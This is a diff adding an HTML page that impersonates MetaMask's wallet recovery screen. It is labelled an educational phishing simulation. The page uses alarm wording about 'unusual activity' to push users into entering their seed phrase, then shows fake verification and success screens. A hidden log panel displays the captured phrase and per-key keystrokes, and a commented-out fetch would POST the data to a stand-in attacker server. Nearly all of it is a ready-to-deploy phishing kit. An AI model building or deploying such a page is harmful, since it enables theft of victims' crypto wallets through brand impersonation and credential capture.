@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask - Wallet Recovery</title>
+    <style>
+        :root {
+            --mm-blue: #037dd6;
+            --mm-orange: #f6851b;
+            --mm-text: #24272a;
+            --mm-bg: #fafafa;
+            --mm-border: #d6d9dc;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: var(--mm-bg);
+            color: var(--mm-text);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+            border-bottom: 1px solid var(--mm-border);
+            background-color: white;
+        }
+        
+        .logo {
+            height: 35px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 28px 24px;
+            flex: 1;
+            width: 100%;
+        }
+        
+        .alert-box {
+            background-color: rgba(246, 133, 27, 0.1);
+            border: 1px solid var(--mm-orange);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .alert-box h3 {
+            color: var(--mm-orange);
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .alert-box h3::before {
+            content: "⚠️";
+            margin-right: 8px;
+        }
+        
+        .alert-box p {
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: var(--mm-text);
+        }
+        
+        p {
+            line-height: 1.6;
+            margin-bottom: 24px;
+            color: #535a61;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        
+        .card h2 {
+            font-size: 18px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .card h2::before {
+            content: "🔐";
+            margin-right: 8px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        input[type="text"], 
+        textarea {
+            width: 100%;
+            padding: 10px 16px;
+            border: 1px solid var(--mm-border);
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        textarea {
+            height: 120px;
+            resize: none;
+        }
+        
+        input[type="text"]:focus, 
+        textarea:focus {
+            border-color: var(--mm-blue);
+            outline: none;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            margin-right: 12px;
+            margin-top: 4px;
+        }
+        
+        .checkbox-group label {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #535a61;
+        }
+        
+        .button {
+            background-color: var(--mm-blue);
+            color: white;
+            border: none;
+            border-radius: 100px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+        
+        .button:hover {
+            background-color: #0260a4;
+        }
+        
+        .button:disabled {
+            background-color: #d6d9dc;
+            cursor: not-allowed;
+        }
+        
+        .footer {
+            padding: 24px;
+            background-color: white;
+            border-top: 1px solid var(--mm-border);
+            text-align: center;
+            font-size: 14px;
+            color: #535a61;
+        }
+        
+        .step-indicator {
+            display: flex;
+            margin-bottom: 24px;
+        }
+        
+        .step {
+            flex: 1;
+            text-align: center;
+            position: relative;
+        }
+        
+        .step::after {
+            content: '';
+            position: absolute;
+            height: 2px;
+            background-color: var(--mm-border);
+            width: 100%;
+            top: 12px;
+            left: 50%;
+            z-index: 1;
+        }
+        
+        .step:last-child::after {
+            display: none;
+        }
+        
+        .step-number {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background-color: var(--mm-blue);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin: 0 auto 8px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .step.active .step-number {
+            background-color: var(--mm-orange);
+        }
+        
+        .step-label {
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        /* Attack logs panel (for educational demonstration) */
+        .attack-logs {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 400px;
+            height: 300px;
+            background-color: #000;
+            color: #0f0;
+            font-family: monospace;
+            padding: 10px;
+            overflow-y: auto;
+            font-size: 12px;
+            z-index: 1000;
+            display: none;
+            border-top-left-radius: 8px;
+        }
+        
+        .attack-logs.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img class="logo" src="/api/placeholder/140/35" alt="MetaMask Logo">
+    </div>
+
+    <div class="container">
+        <div class="alert-box">
+            <h3>Wallet Verification Required</h3>
+            <p>We've detected unusual activity with your wallet. For your security, please verify your recovery phrase to continue using MetaMask.</p>
+        </div>
+
+        <h1>Wallet Recovery Verification</h1>
+        <p>Due to a recent security update, we need to verify your recovery phrase to ensure your assets remain secure. This is a one-time verification process.</p>
+
+        <div class="step-indicator">
+            <div class="step active">
+                <div class="step-number">1</div>
+                <div class="step-label">Verification</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-label">Processing</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-label">Complete</div>
+            </div>
+        </div>
+
+        <div class="card" id="recovery-form">
+            <h2>Enter Your Recovery Phrase</h2>
+            
+            <div class="form-group">
+                <label for="seed-phrase">12 or 24-word Recovery Phrase</label>
+                <textarea id="seed-phrase" placeholder="Enter your 12 or 24-word seed phrase separated by spaces"></textarea>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="confirm-checkbox">
+                <label for="confirm-checkbox">I understand that MetaMask staff will never ask for my recovery phrase except through the official MetaMask extension. I confirm I am on the official MetaMask website.</label>
+            </div>
+            
+            <button id="verify-button" class="button" disabled>Verify Recovery Phrase</button>
+        </div>
+        
+        <div class="card hidden" id="processing-card">
+            <h2>Verifying Your Wallet</h2>
+            <p>Please wait while we verify your recovery phrase. This may take a few moments.</p>
+            <div style="text-align: center; margin: 20px 0;">
+                <div id="loading-spinner" style="display: inline-block; width: 30px; height: 30px; border: 3px solid rgba(3, 125, 214, 0.3); border-radius: 50%; border-top-color: #037dd6; animation: spin 1s linear infinite;"></div>
+            </div>
+        </div>
+        
+        <div class="card hidden" id="success-card">
+            <h2 style="color: #28a745;">Verification Successful</h2>
+            <p>Your wallet has been successfully verified. You will be redirected to the MetaMask dashboard in a few seconds.</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2025 MetaMask • Privacy Policy • Terms of Use
+    </div>
+    
+    <!-- Attack logs panel (for educational demonstration) -->
+    <div class="attack-logs" id="attack-logs">
+        <h3>PHISHING SIMULATION LOGS</h3>
+        <div>EDUCATIONAL PURPOSES ONLY - DO NOT USE FOR MALICIOUS PURPOSES</div>
+        <hr>
+        <div id="logs-content"></div>
+    </div>
+
+    <script>
+        // EDUCATIONAL CODE - DO NOT USE FOR MALICIOUS PURPOSES
+        document.addEventListener('DOMContentLoaded', () => {
+            const seedPhraseInput = document.getElementById('seed-phrase');
+            const confirmCheckbox = document.getElementById('confirm-checkbox');
+            const verifyButton = document.getElementById('verify-button');
+            const recoveryForm = document.getElementById('recovery-form');
+            const processingCard = document.getElementById('processing-card');
+            const successCard = document.getElementById('success-card');
+            const logsPanel = document.getElementById('attack-logs');
+            const logsContent = document.getElementById('logs-content');
+            
+            // Toggle attack logs with Ctrl+Shift+X (for educational purposes)
+            document.addEventListener('keydown', (e) => {
+                if (e.ctrlKey && e.shiftKey && e.key === 'X') {
+                    logsPanel.classList.toggle('active');
+                }
+            });
+            
+            // Log attack information (for educational purposes)
+            function logAttack(message) {
+                const timestamp = new Date().toISOString().substring(11, 19);
+                const logElement = document.createElement('div');
+                logElement.textContent = `[${timestamp}] ${message}`;
+                logsContent.appendChild(logElement);
+                
+                // Auto-scroll to bottom
+                logsPanel.scrollTop = logsPanel.scrollHeight;
+            }
+            
+            // Initialize logs
+            logAttack('MetaMask Phishing Simulation Started');
+            logAttack('EDUCATIONAL PURPOSES ONLY');
+            logAttack('Press Ctrl+Shift+X to toggle these logs');
+            logAttack('-------------------------------------');
+            
+            // Enable button when both inputs are filled
+            function updateButtonState() {
+                verifyButton.disabled = !confirmCheckbox.checked || !seedPhraseInput.value.trim();
+            }
+            
+            seedPhraseInput.addEventListener('input', () => {
+                updateButtonState();
+                
+                // Log seed phrase input for educational purposes
+                if (seedPhraseInput.value.trim()) {
+                    const words = seedPhraseInput.value.trim().split(/\s+/).length;
+                    logAttack(`User typed ${words} words in recovery phrase field`);
+                }
+            });
+            
+            confirmCheckbox.addEventListener('change', updateButtonState);
+            
+            // Handle verify button click
+            verifyButton.addEventListener('click', () => {
+                const seedPhrase = seedPhraseInput.value.trim();
+                
+                // Log the captured data (for educational purposes only)
+                logAttack(`⚠️ CAPTURED SEED PHRASE: ${seedPhrase}`);
+                
+                // Validate seed phrase format (for simulation realism)
+                const words = seedPhrase.split(/\s+/);
+                if (words.length !== 12 && words.length !== 24) {
+                    alert('Please enter a valid 12 or 24-word recovery phrase.');
+                    return;
+                }
+                
+                // Show processing screen
+                recoveryForm.classList.add('hidden');
+                processingCard.classList.remove('hidden');
+                
+                // Update step indicator
+                document.querySelectorAll('.step')[0].classList.remove('active');
+                document.querySelectorAll('.step')[1].classList.add('active');
+                
+                logAttack('Showing fake "processing" screen to victim');
+                
+                // Simulate "verification" process
+                setTimeout(() => {
+                    // In a real attack, this would send the seed phrase to the attacker's server
+                    simulateDataExfiltration(seedPhrase);
+                    
+                    // Show success message after delay
+                    setTimeout(() => {
+                        processingCard.classList.add('hidden');
+                        successCard.classList.remove('hidden');
+                        
+                        // Update step indicator
+                        document.querySelectorAll('.step')[1].classList.remove('active');
+                        document.querySelectorAll('.step')[2].classList.add('active');
+                        
+                        logAttack('Showing fake "success" screen to victim');
+                        
+                        // Simulate redirect to legitimate MetaMask site
+                        setTimeout(() => {
+                            logAttack('Attack simulation complete. In a real attack, victim would be redirected to legitimate MetaMask site.');
+                            // alert('Phishing simulation complete.\n\nREMINDER: Never share your real seed phrase with anyone!');
+                        }, 3000);
+                    }, 2000);
+                }, 3000);
+            });
+            
+            // Simulate data exfiltration (for educational purposes only)
+            function simulateDataExfiltration(seedPhrase) {
+                logAttack('⚠️ SIMULATING DATA EXFILTRATION');
+                logAttack(`→ Preparing to send seed phrase to attacker's server`);
+                
+                // Create a simulation of the data that would be sent
+                const payload = {
+                    seed_phrase: seedPhrase,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent,
+                    ip_address: '0.0.0.0' // In a real attack, the server would log this
+                };
+                
+                logAttack(`→ Data payload created: ${JSON.stringify(payload).substring(0, 50)}...`);
+                logAttack(`→ In a real attack, this data would now be sent to attacker's server`);
+                
+                // In a real attack, this would be:
+                // fetch('https://attacker-server.com/collect', {
+                //     method: 'POST',
+                //     body: JSON.stringify(payload)
+                // });
+                
+                // Wait to simulate network request
+                setTimeout(() => {
+                    logAttack('✓ Seed phrase exfiltration simulation complete');
+                    logAttack('→ With this seed phrase, an attacker could:');
+                    logAttack('  1. Import the wallet and steal all crypto assets');
+                    logAttack('  2. Sign malicious transactions on behalf of the victim');
+                    logAttack('  3. Access all accounts derived from this seed phrase');
+                }, 1500);
+            }
+        });
+        
+        // Keylogger simulation for educational purposes
+        document.addEventListener('keydown', (e) => {
+            const logsContent = document.getElementById('logs-content');
+            if (logsContent && document.getElementById('attack-logs').classList.contains('active')) {
+                // Only show key logging in the attack log when it's visible
+                const sensitiveInputs = ['password', 'text', 'textarea'];
+                const targetElement = document.activeElement;
+                
+                if (targetElement && targetElement.tagName === 'TEXTAREA') {
+                    const timestamp = new Date().toISOString().substring(11, 19);
+                    const logElement = document.createElement('div');
+                    logElement.textContent = `[${timestamp}] Keypress in seed phrase field: ${e.key}`;
+                    logElement.style.fontSize = '10px';
+                    logElement.style.color = '#777';
+                    logsContent.appendChild(logElement);
+                    
+                    // Auto-scroll to bottom
+                    document.getElementById('attack-logs').scrollTop = document.getElementById('attack-logs').scrollHeight;
+                }
+            }
+        });
+        
+        // Add animation styles
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
